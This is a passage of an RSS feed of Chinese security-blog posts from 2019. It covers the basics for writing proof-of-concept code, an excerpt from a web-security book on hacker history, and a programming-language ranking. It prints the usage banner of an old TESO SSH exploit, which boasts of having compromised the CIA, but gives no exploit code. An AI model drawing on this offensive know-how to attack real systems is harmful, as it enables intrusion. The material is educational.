开发文档地址&lt;/a&gt;&lt;/li&gt;&lt;li&gt;其它&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;网络基础&lt;/h2&gt;&lt;h2&gt;&lt;b&gt;为什么要学网络&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;安全界不缺乏有一些人连计算机网络是什么都不清楚，但是拿站，渗透一搞一个准。然而像我这种整天把基础知识挂在嘴边的人，拿站的时候照样怂。基础知识在我看来，是种常识，是种工具，不能说不会基础知识的人就一定不能怎么样，我只能说，我建议，我推荐，我支持先从基础学起来，这样在后面的学习当中就会如鱼得水。&lt;/p&gt;&lt;h2&gt;需要学什么&lt;/h2&gt;&lt;p&gt;对于写 PoC 来说，我们需要的并不是你去把 OSI 7 层模型的每一层都精通，你要精通了所有层的东西，你就不会坐在这里了。&lt;/p&gt;&lt;p&gt;好了，大概说一下我们需要了解哪些，相关的专业知识你可以去百度和Goole。&lt;/p&gt;&lt;ul&gt;&lt;li&gt;请求响应配对&lt;/li&gt;&lt;li&gt;域名系统&lt;/li&gt;&lt;li&gt;IP 地址&lt;/li&gt;&lt;li&gt;TCP 是做什么的&lt;/li&gt;&lt;li&gt;HTTP 协议(请重点关注这个，后面很多地方都会用到)&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;编码基础&lt;/h2&gt;&lt;p&gt;编码基础这里不要求你精通, 毕竟一开始就深化了一下 PoC 的概念，他就是一个不完整的程序，所以你只要会一些常用的就 OK, 不要说你不会这种话，不会可以花一点时间来学，放心，根本不需要你达到一个什么样的深度。&lt;/p&gt;&lt;p&gt;那我就大概写一下需要学什么东西了：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;HTML&lt;br/&gt;这里不单是看 HTML 语言，更多的要去理解什么是&lt;b&gt;浏览器&lt;/b&gt;。你看到的漂亮的不像实力派的网页，在传输的时候是什么样子的，浏览器在接收到响应之后大概做了点什么事。&lt;/li&gt;&lt;li&gt;Javascript&lt;br/&gt;想学 XSS, CSRF 不会这两个可不行。&lt;/li&gt;&lt;li&gt;Python&lt;br/&gt;我们后面写 PoC 会用到，所以这个要必会。这里只需要你会一点点 Python 的语法和一些常用的功能库就够了。&lt;/li&gt;&lt;li&gt;SQL&lt;/li&gt;&lt;li&gt;正则表达式&lt;br/&gt;自动化过程中经常需要自动匹配，不需要精通，但是要多多少少会一些。怎么测试你会了呢？我给你任意一个 wooyun 的漏洞页面，然后你能用脚本把里面的漏洞标题，作者，漏洞提交时间等等信息能够轻松用正则表达式提取出来，呐，这样就 OK 了。&lt;/li&gt;&lt;/ul&gt;&lt;h3&gt;关于 Python 的一些库&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;urllib&lt;/li&gt;&lt;li&gt;urllib2&lt;/li&gt;&lt;li&gt;requests&lt;/li&gt;&lt;li&gt;httplib&lt;/li&gt;&lt;li&gt;cookielib&lt;br/&gt;发送 HTTP 请求的，当然还有一些其他的。&lt;/li&gt;&lt;li&gt;urlparse&lt;br/&gt;处理 url 的&lt;/li&gt;&lt;li&gt;re&lt;br/&gt;正则表达式&lt;/li&gt;&lt;li&gt;random&lt;br/&gt;看名字就知道是生成随机数的&lt;/li&gt;&lt;li&gt;hashlib&lt;br/&gt;md5 算法帮你集成在这里了&lt;/li&gt;&lt;li&gt;base64&lt;br/&gt;base64 编码全家福都在这里&lt;/li&gt;&lt;li&gt;socket&lt;br/&gt;如果你知道 TCP 和 HTTP 的关系的话，你就能理解 socket 和 urllib 的关系了。&lt;/li&gt;&lt;/ul&gt;&lt;p class=&quot;ztext-empty-paragraph&quot;&gt;&lt;br/&gt;&lt;/p&gt;&lt;p&gt;文/Medici.Yan&lt;/p&gt;&lt;p&gt;GitHub: &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/Medicean&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/Medicean&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;</description>
<author>二向箔安全</author>
<guid isPermaLink="false">2019-08-09-77353899</guid>
<pubDate>Fri, 09 Aug 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>黑客那些事儿</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2019-08-08-77195745.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/77195745&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-effc0df18872479281d08a32eed4b778_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;黑客和脚本小子&lt;/h2&gt;&lt;p&gt;在计算机安全领域，黑客是一群破坏规则、不喜欢被拘束的人，因此总想着能够找到系统的漏洞，以获得一些规则之外的权力。&lt;/p&gt;&lt;p&gt;对于现代计算机系统来说，在用户态的最高权限是root（administrator），也是黑客们最渴望能够获取的系统最高权限。“root”对黑客的吸引，就像大米对老鼠的吸引，美女对色狼的吸引。&lt;/p&gt;&lt;p&gt;不想拿到“root”的黑客，不是好黑客。漏洞利用代码能够帮助黑客们达成这一目标。黑客们使用的漏洞利用代码，被称为“exploit”。在黑客的世界里，有的黑客，精通计算机技术，能自己挖掘漏洞，并编写exploit；而有的黑客，则只对攻击本身感兴趣，对计算机原理和各种编程技术的了解比较粗浅，因此只懂得编译别人的代码，自己并没有动手能力，这种黑客被称为“Script Kids”，即“脚本小子”。在现实世界里，真正造成破坏的，往往并非那些挖掘并研究漏洞的“黑客”们，而是这些脚本小子。而在今天已经形成产业的计算机犯罪、网络犯罪中，造成主要破坏的，也是这些“脚本小子”。&lt;/p&gt;&lt;h2&gt;黑客技术的发展&lt;/h2&gt;&lt;p&gt;从黑客技术发展的角度看，在早期，黑客攻击的目标以系统软件居多。一方面，是由于这个时期的 Web 技术发展还远远不成熟；另一方面，则是因为通过攻击系统软件，黑客们往往能够直接获取 root 权限。这段时期，涌现出了非常多的经典漏洞以及“exploit”。比如著名的黑客组织TESO，就曾经编写过一个攻击 SSH 的 exploit，并公然在 exploit 的 banner 中宣称曾经利用这个 exploit 入侵过 &lt;a href=&quot;https://link.zhihu.com/?target=http%3A//cia.gov&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;http://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;cia.gov&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;&lt;/span&gt;&lt;/a&gt;（美国中央情报局）。&lt;/p&gt;&lt;p&gt;下面是这个&lt;a href=&quot;https://link.zhihu.com/?target=http%3A//staff.washington.edu/dittrich/misc/ssh-analysis.txt&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;exploit&lt;/a&gt;的一些信息。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;root@plac /bin &amp;gt;&amp;gt; ./ssh
linux/x86 sshd1 exploit by zip/TESO (zip@james.kalifornia.com) - ripped from openssh 2.2.0 src
greets: mray, random, big t, sh1fty, scut, dvorak
ps. this sploit already owned Central Intelligence Agency :/
＊＊please pick a type＊＊
Usage: ./ssh host [options]
Options:
  -p port
  -b baseBase address to start bruteforcing distance, by default 0x1800, goes as high as 0x10000
  -t type
  -d          debug mode
  -o     Add this to delta_min
types:
0: linux/x86 ssh.com 1.2.26-1.2.31 rhl
1: linux/x86 openssh 1.2.3 (maybe others)
2: linux/x86 openssh 2.2.0p1 (maybe others)
3: freebsd 4.x, Secure Shell and software beyond the protocol 1.2.26-1.2.31 rhl&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;有趣的是，这个 exploit 还曾经出现在著名电影《黑客帝国2》中：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-ae40dba84b54824989bdef5edd1c34c5_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;787&quot; data-rawheight=&quot;334&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;787&quot; data-original=&quot;https://pic2.zhimg.com/v2-ae40dba84b54824989bdef5edd1c34c5_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-ae40dba84b54824989bdef5edd1c34c5_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;787&quot; data-rawheight=&quot;334&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;787&quot; data-original=&quot;https://pic2.zhimg.com/v2-ae40dba84b54824989bdef5edd1c34c5_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-ae40dba84b54824989bdef5edd1c34c5_b.jpg&quot;/&gt;&lt;figcaption&gt;电影《黑客帝国2》&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;放大屏幕上的文字可以看到：&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-39d5d67b7cbcdbc9a3683e1e1c4582b0_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;787&quot; data-rawheight=&quot;490&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;787&quot; data-original=&quot;https://pic1.zhimg.com/v2-39d5d67b7cbcdbc9a3683e1e1c4582b0_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-39d5d67b7cbcdbc9a3683e1e1c4582b0_b.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;787&quot; data-rawheight=&quot;490&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;787&quot; data-original=&quot;https://pic1.zhimg.com/v2-39d5d67b7cbcdbc9a3683e1e1c4582b0_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-39d5d67b7cbcdbc9a3683e1e1c4582b0_b.jpg&quot;/&gt;&lt;figcaption&gt;电影《黑客帝国2》中使用的著名exploit&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;在早期互联网中，Web 并非互联网的主流应用，相对来说，基于SMTP、POP3、FTP、IRC等协议的服务拥有着绝大多数的用户。因此黑客们主要的攻击目标是网络、操作系统以及软件等领域，Web 安全领域的攻击与防御技术均处于非常原始的阶段。&lt;/p&gt;&lt;p&gt;相对于那些攻击系统软件的exploit而言，基于 Web 的攻击，一般只能让黑客获得一个较低权限的账户，对黑客的吸引力远远不如直接攻击系统软件。&lt;/p&gt;&lt;p&gt;但是时代在发展，防火墙技术的兴起改变了互联网安全的格局。尤其是以Cisco、华为等为代表的网络设备厂商，开始在网络产品中更加重视网络安全，最终改变了互联网安全的走向。防火墙、ACL技术的兴起，使得直接暴露在互联网上的系统得到了保护。&lt;/p&gt;&lt;p&gt;比如一个网站的数据库，在没有保护的情况下，数据库服务端口是允许任何人随意连接的；在有了防火墙的保护后，通过ACL可以控制只允许信任来源的访问。这些措施在很大程度上保证了系统软件处于信任边界之内，从而杜绝了大部分的攻击来源。&lt;/p&gt;&lt;p&gt;2003年的冲击波蠕虫是一个里程碑式的事件，这个针对Windows操作系统RPC服务（运行在445端口）的蠕虫，在很短的时间内席卷了全球，造成了数百万台机器被感染，损失难以估量。在此次事件后，网络运营商们很坚决地在骨干网络上屏蔽了135、445等端口的连接请求。此次事件之后，整个互联网对于安全的重视达到了一个空前的高度。2017年5月12日，又爆发了一个运行在445端口上的勒索蠕虫病毒，席卷全球，名曰“永恒之蓝”，历史总是惊人的相似。&lt;/p&gt;&lt;p&gt;运营商、防火墙对于网络的封锁，使得暴露在互联网上的非 Web 服务越来越少，且 Web 技术的成熟使得 Web 应用的功能越来越强大，最终成为了互联网的主流。黑客们的目光，也渐渐转移到了 Web 这块大蛋糕上。&lt;/p&gt;&lt;h2&gt;Web 安全&lt;/h2&gt;&lt;p&gt;Web 攻击技术的发展也可以分为几个阶段。在 Web 1.0时代，人们更多的是关注服务器端动态脚本的安全问题，比如将一个可执行脚本（俗称webshell）上传到服务器上，从而获得权限。动态脚本语言的普及，以及 Web 技术发展初期对安全问题认知的不足导致很多“血案”的发生，同时也遗留下很多历史问题，比如 PHP 语言至今仍然只能靠较好的代码规范来保证没有文件包含漏洞，而无法从语言本身杜绝此类安全问题的发生。&lt;/p&gt;&lt;p&gt;SQL注入的出现是 Web 安全史上的一个里程碑，它最早出现大概是在1999年，并很快就成为Web安全的头号大敌。就如同缓冲区溢出出现时一样，程序员们不得不日以继夜地去修改程序中存在的漏洞。黑客们发现通过SQL注入攻击，可以获取很多重要的、敏感的数据，甚至能够通过数据库获取系统访问权限，这种效果并不比直接攻击系统软件差，Web攻击一下子就流行起来。SQL注入漏洞至今仍然是Web安全领域中的一个重要组成部分。&lt;/p&gt;&lt;p&gt;XSS（跨站脚本攻击）的出现则是 Web 安全史上的另一个里程碑。实际上，XSS 的出现时间和 SQL 注入差不多，但是真正引起人们重视则是在大概2003年以后。在经历了 MySpace 的 XSS 蠕虫事件后，安全界对 XSS 的重视程度提高了很多，OWASP 2007 TOP 10威胁甚至把 XSS 排在榜首。&lt;/p&gt;&lt;p&gt;伴随着 Web 2.0的兴起，XSS、CSRF等攻击已经变得更为强大。Web 攻击的思路也从服务器端转向了客户端，转向了浏览器和用户。黑客们天马行空的思路，覆盖了 Web 的每一个环节，变得更加的多样化，这些安全问题，在本书后续的章节中会深入地探讨。&lt;/p&gt;&lt;p&gt;Web 技术发展到今天，构建出了丰富多彩的互联网。互联网业务的蓬勃发展，也催生出了许多新兴的脚本语言，比如 Python、Ruby、NodeJS 等，敏捷开发成为互联网的主旋律。而手机技术、移动互联网的兴起，也给 HTML 5 带来了新的机遇和挑战。与此同时，Web 安全技术，也将紧跟着互联网发展的脚步，不断地演化出新的变化。&lt;/p&gt;&lt;h2&gt;黑帽子和白帽子&lt;/h2&gt;&lt;p&gt;正如一个硬币有两面一样，“黑客”也有好坏之分。在黑客的世界中，往往用帽子的颜色来比喻黑客的好坏。白帽子，则是指那些精通安全技术，但是工作在反黑客领域的专家们；而黑帽子，则是指利用黑客技术造成破坏，甚至进行网络犯罪的群体。&lt;/p&gt;&lt;p&gt;同样是研究安全，白帽子和黑帽子在工作时的心态是完全不同的。&lt;/p&gt;&lt;p&gt;对于黑帽子来说，只要能够找到系统的一个弱点，就可以达到入侵系统的目的；而对于白帽子来说，必须找到系统的所有弱点，不能有遗漏，才能保证系统不会出现问题。这种差异是由于工作环境与工作目标的不同所导致的。白帽子一般为企业或安全公司服务，工作的出发点就是要解决所有的安全问题，因此所看所想必然要求更加的全面、宏观；黑帽子的主要目的是要入侵系统，找到对他们有价值的数据，因此黑帽子只需要以点突破，找到对他们最有用的一点，以此渗透，因此思考问题的出发点必然是有选择性的、微观的。&lt;/p&gt;&lt;p&gt;从对待问题的角度来看，黑帽子为了完成一次入侵，需要利用各种不同漏洞的组合来达到目的，是在不断地组合问题；而白帽子在设计解决方案时，如果只看到各种问题组合后产生的效果，就会把事情变复杂，难以细致入微地解决根本问题，所以白帽子必然是在不断地分解问题，再对分解后的问题逐个予以解决。&lt;/p&gt;&lt;p&gt;这种定位的不对称，也导致了白帽子的安全工作比较难做。“破坏永远比建设容易”，但凡事都不是绝对的。要如何扭转这种局面呢？一般来说，白帽子选择的方法，是克服某种攻击方法，而并非抵御单次的攻击。比如设计一个解决方案，在特定环境下能够抵御所有已知的和未知的 SQL Injection 问题。假设这个方案的实施周期是3个月，那么执行3个月后，所有的 SQL Injection 问题都得到了解决，也就意味着黑客再也无法利用 SQL Injection 这一可能存在的弱点入侵网站了。如果做到了这一点，那么白帽子们就在 SQL Injection 的局部对抗中化被动为主动了。&lt;/p&gt;&lt;p&gt;但这一切都是理想状态，在现实世界中，存在着各种各样不可回避的问题。工程师们很喜欢一句话：“No Patch For Stupid! ”，在安全领域也普遍认为：“最大的漏洞就是人！”。写得再好的程序，在有人参与的情况下，就可能会出现各种各样不可预知的情况，比如管理员的密码有可能泄露，程序员有可能关掉了安全的配置参数，等等。安全问题往往发生在一些意想不到的地方。&lt;/p&gt;&lt;p&gt;另一方面，防御技术在不断完善的同时，攻击技术也在不断地发展。&lt;/p&gt;&lt;p&gt;摘自：《白帽子讲 Web 安全》&lt;/p&gt;&lt;p&gt;（PS: 这本书真的很值得一看！）&lt;/p&gt;</description>
<author>二向箔安全</author>
<guid isPermaLink="false">2019-08-08-77195745</guid>
<pubDate>Thu, 08 Aug 2019 00:00:00 +0800</pubDate>
</item>
<item>
<title>2019 年 8 月份编程语言排行榜</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2019-08-07-77029069.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/77029069&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-f1cdf7dddfd83441c6e2add40dbd704c_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.tiobe.com/tiobe-index/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;TIOBE 编程社区指数&lt;/a&gt;是编程语言流行度的指标，该榜单每月更新一次，指数基于全球技术工程师、课程和第三方供应商的数量。包括流行的搜索引擎，如谷歌、必应、雅虎、维基百科、亚马逊、YouTube 和百度都用于指数计算。&lt;/p&gt;&lt;p&gt;排名前十的分别是：Java, C, Python, C++, C#, Visual Basic .NET, JavaScript, PHP，Objective-C 和 SQL。相比于7 月份，前 10 排名基本没变，只有 Objective-C 和 SQL 交换了位置。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-f264579fd61cdfabecf1f67248e87855_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;959&quot; data-rawheight=&quot;763&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;959&quot; data-original=&quot;https://pic2.zhimg.com/v2-f264579fd61cdfabecf1f67248e87855_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-f264579fd61cdfabecf1f67248e87855_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;959&quot; data-rawheight=&quot;763&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;959&quot; data-original=&quot;https://pic2.zhimg.com/v2-f264579fd61cdfabecf1f67248e87855_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-f264579fd61cdfabecf1f67248e87855_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;由此可见，排名第一的Java仍然具有独孤求败的势头，Java继续统治着程序员最常用的语言列表。&lt;/p&gt;&lt;p&gt;Java保持持久吸引力的一个重要原因是 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.javaworld.com/article/3272244/core-java/what-is-the-jvm-introducing-the-java-virtual-machine.html&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Java虚拟机（JVM） &lt;/a&gt;。JVM使得在不同的硬件平台和设备上运行每种语言成为可能。Java还能处理让开发人员感到头疼的，数据类型和内存管理相关的许多任务。简化应用程序开发并在不同操作系统中部署应用的能力使Java成为大型组织的首选语言。这意味着，Java可以让你在一家大公司找到稳定的工作。Java的另一个重要用途是编写原生Android应用程序。 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.statista.com/statistics/266136/global-market-share-held-by-smartphone-operating-systems/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Android市场份额 &lt;/a&gt;在 智能手机操作系统一股独大，这也是许多开发人员学习Java的主要动机之一。&lt;/p&gt;&lt;p&gt;&lt;b&gt;Top 10 编程语言 TIOBE 指数走势（2002-2018）&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-4dc65080192d5643e85362272a81a8fc_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;958&quot; data-rawheight=&quot;454&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;958&quot; data-original=&quot;https://pic1.zhimg.com/v2-4dc65080192d5643e85362272a81a8fc_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-4dc65080192d5643e85362272a81a8fc_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;958&quot; data-rawheight=&quot;454&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;958&quot; data-original=&quot;https://pic1.zhimg.com/v2-4dc65080192d5643e85362272a81a8fc_r.jpg&quot; data-actualsrc=&quot;https://pic1.zhimg.com/v2-4dc65080192d5643e85362272a81a8fc_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;b&gt;年度最佳编程语言（2003-2018）&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-5aaf88e4e0fa50560611400a88200492_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;478&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;720&quot; data-original=&quot;https://pic3.zhimg.com/v2-5aaf88e4e0fa50560611400a88200492_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-5aaf88e4e0fa50560611400a88200492_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;720&quot; data-rawheight=&quot;478&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;720&quot; data-original=&quot;https://pic3.zhimg.com/v2-5aaf88e4e0fa50560611400a88200492_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-5aaf88e4e0fa50560611400a88200492_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;随着 AI、ML、数据分析、基于算法的开发引起世界的关注，Python 已成为当前大多数程序员的宠儿。不管是初学者还是经验丰富的开发人员，Python 都是他们的最爱，不仅因为它容易学习，还因为对它的需求在不断增长。&lt;/p&gt;&lt;p&gt;Python 一直以其语法简单和易用性而备受青睐。Python 的应用包括数据分析、Web 开发、科学和数字应用、ERP 开发、游戏开发等等。Python 还支持更多的应用场景，如数据库连接、网络、编程、机器人、网络爬虫、AI、ML 等。&lt;/p&gt;&lt;p&gt;可以看出，Python现在是最受欢迎的程序员编程语言。&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>二向箔安全</author>
<guid isPermaLink="false">2019-08-07-77029069</guid>
<pubDate>Wed, 07 Aug 2019 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
